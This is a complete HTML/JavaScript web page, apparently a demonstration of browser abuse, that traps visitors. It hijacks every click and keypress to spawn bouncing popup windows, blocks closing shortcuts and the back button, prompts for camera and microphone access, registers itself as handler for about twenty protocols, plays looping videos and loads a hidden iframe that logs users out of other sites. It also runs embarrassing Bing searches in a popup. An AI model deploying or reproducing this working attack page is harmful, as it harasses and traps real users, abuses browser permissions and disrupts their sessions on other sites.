<!--
  Same as before, but intercept as many shortcuts as possible

  Demo: in Safari

  Also: in Chrome hold down the space key

-->
<html>
<body>

<style>
  html, body { width: 100%; height: 100%; margin: 0; }
  video { width: 100%; height: 100%; }
  iframe { width: 1px; height: 1px; } /* Make iframes invisible */
  #pip-video { opacity: 0; height: 1; }
</style>

<video id='pip-video' src='trolol.mp4' autoplay muted loop>

<script>
  const SCREEN_WIDTH = window.screen.availWidth
  const SCREEN_HEIGHT = window.screen.availHeight
  const WINDOW_WIDTH = 480
  const WINDOW_HEIGHT = 260
  const VELOCITY = 15
  const MARGIN = 10
  const TICK_LENGTH = 50

  const SEARCHES = [
    'where should i bury the body',
    'why does my eye twitch',
    'why is my poop green',
    'why do i feel so empty',
    'why do i always feel hungry',
    'why do i always have diarrhea',
    'why does my anus itch',
    'why does my belly button smell',
    'why does my cat attack me',
    'why does my dog eat poop',
    'why does my fart smell so bad',
    'why does my mom hate me',
    'why does my pee smell bad',
    'why does my poop float',
    'proof that the earth is flat'
  ]

  window.addEventListener('beforeunload', event => {
    event.returnValue = true
  })

  if (navigator.registerProtocolHandler) {
    const handlerUrl = window.location.href + '/url=%s'
    navigator.registerProtocolHandler('bitcoin', handlerUrl, 'haha')
    navigator.registerProtocolHandler('geo', handlerUrl, 'haha')
    navigator.registerProtocolHandler('im', handlerUrl, 'haha')
    navigator.registerProtocolHandler('irc', handlerUrl, 'haha')
    navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
    navigator.registerProtocolHandler('magnet', handlerUrl, 'haha')
    navigator.registerProtocolHandler('mailto', handlerUrl, 'haha')
    navigator.registerProtocolHandler('mms', handlerUrl, 'haha')
    navigator.registerProtocolHandler('news', handlerUrl, 'haha')
    navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
    navigator.registerProtocolHandler('nntp', handlerUrl, 'haha')
    navigator.registerProtocolHandler('sip', handlerUrl, 'haha')
    navigator.registerProtocolHandler('sms', handlerUrl, 'haha')
    navigator.registerProtocolHandler('smsto', handlerUrl, 'haha')
    navigator.registerProtocolHandler('ssh', handlerUrl, 'haha')
    navigator.registerProtocolHandler('tel', handlerUrl, 'haha')
    navigator.registerProtocolHandler('urn', handlerUrl, 'haha')
    navigator.registerProtocolHandler('webcal', handlerUrl, 'haha')
    navigator.registerProtocolHandler('wtai', handlerUrl, 'haha')
    navigator.registerProtocolHandler('xmpp', handlerUrl, 'haha')
  }

  // Intercept all shortcuts
  document.body.addEventListener('mousedown', handleUserInput)
  document.body.addEventListener('click', handleUserInput)
  document.body.addEventListener('mouseup', handleUserInput)
  document.body.addEventListener('keydown', handleUserInput)
  document.body.addEventListener('keypress', handleUserInput)
  document.body.addEventListener('keyup', handleUserInput)

  function handleUserInput (event) {
    focusWindows()
    openWindow()

    navigator.getUserMedia({ audio: true, video: true }, () => {}, () => {})

    const pipVideo = document.querySelector('#pip-video')
    if (pipVideo.webkitSetPresentationMode) {
      pipVideo.muted = false
      pipVideo.webkitSetPresentationMode('picture-in-picture')
    }

    // Prevent default behavior (breaks closing window shortcuts)
    event.preventDefault()
    event.stopPropagation()
  }

  navigator.getUserMedia({ audio: true, video: true }, () => {}, () => {})

  if (window.opener) {
    // *** RUNS IN CHILD WINDOW: ***

    let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
    let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

    window.setInterval(() => {
      const x = window.screenX
      const y = window.screenY
      const width = window.outerWidth
      const height = window.outerHeight

      if (x < MARGIN) vx = Math.abs(vx)
      if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
      if (y < MARGIN + 20) vy = Math.abs(vy)
      if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

      window.moveBy(vx, vy)
    }, TICK_LENGTH)

    const VIDEOS = ['nyan.mp4', 'cat.mp4', 'trolol.mp4']
    const video = document.createElement('video')
    video.src = VIDEOS[Math.floor(Math.random() * VIDEOS.length)]
    video.autoplay = true
    video.loop = true

    document.body.appendChild(video)

    window.onunload = () => {
      if (!window.opener.closed) window.opener.onCloseWindow(window)
    }
  }

  if (!window.opener) {
    // *** RUNS IN PARENT WINDOW: ***

    const logoutIframe = document.createElement('iframe')
    logoutIframe.src = 'http://superlogout.com'
    document.body.appendChild(logoutIframe)

    for (let i = 1; i < 20; i++) {
      window.history.pushState({}, '', window.location.pathname + '?q=' + i)
    }
    window.history.pushState({}, '', window.location.pathname)
    window.addEventListener('popstate', () => {
      window.history.forward()
    })

    // setInterval(() => window.alert(Array(100).join('ARE YOU ANNOYED YET? ')), 15000)
  }

  // *** RUNS IN PARENT AND CHILD WINDOWS: ***

  let wins = []

  function openWindow () {
    const { x, y } = getRandomCoords()
    const win = window.open(window.location.pathname, '', `width=${WINDOW_WIDTH},height=${WINDOW_HEIGHT},left=${x},top=${y}`)
    if (!win) return

    if (wins.length === 1) {
      setupSearchWindow(win)
    }

    wins.push(win)
  }

  function getRandomCoords () {
    const x = MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WINDOW_WIDTH - MARGIN))
    const y = MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - WINDOW_HEIGHT - MARGIN))
    return { x, y }
  }

  function setupSearchWindow (win) {
    if (!win) return
    win.window.location = 'http://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
    let searchIndex = 1
    let interval = setInterval(() => {
      if (searchIndex >= SEARCHES.length) {
        clearInterval(interval)
        win.window.location = window.location.pathname
        return
      }

      if (win.closed) {
        clearInterval(interval)
        onCloseWindow(win)
        return
      }

      win.window.location = window.location.pathname
      setTimeout(() => {
        const { x, y } = getRandomCoords()
        win.moveTo(x, y)
        win.window.location = 'http://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
        searchIndex += 1
      }, 100)
    }, 2000)
  }

  function focusWindows () {
    wins.forEach(win => {
      if (win.focus) win.focus()
    })
  }

  function onCloseWindow (win) {
    const i = wins.indexOf(win)
    if (i >= 0) wins.splice(i, 1)
  }

</script>

</body>
</html>
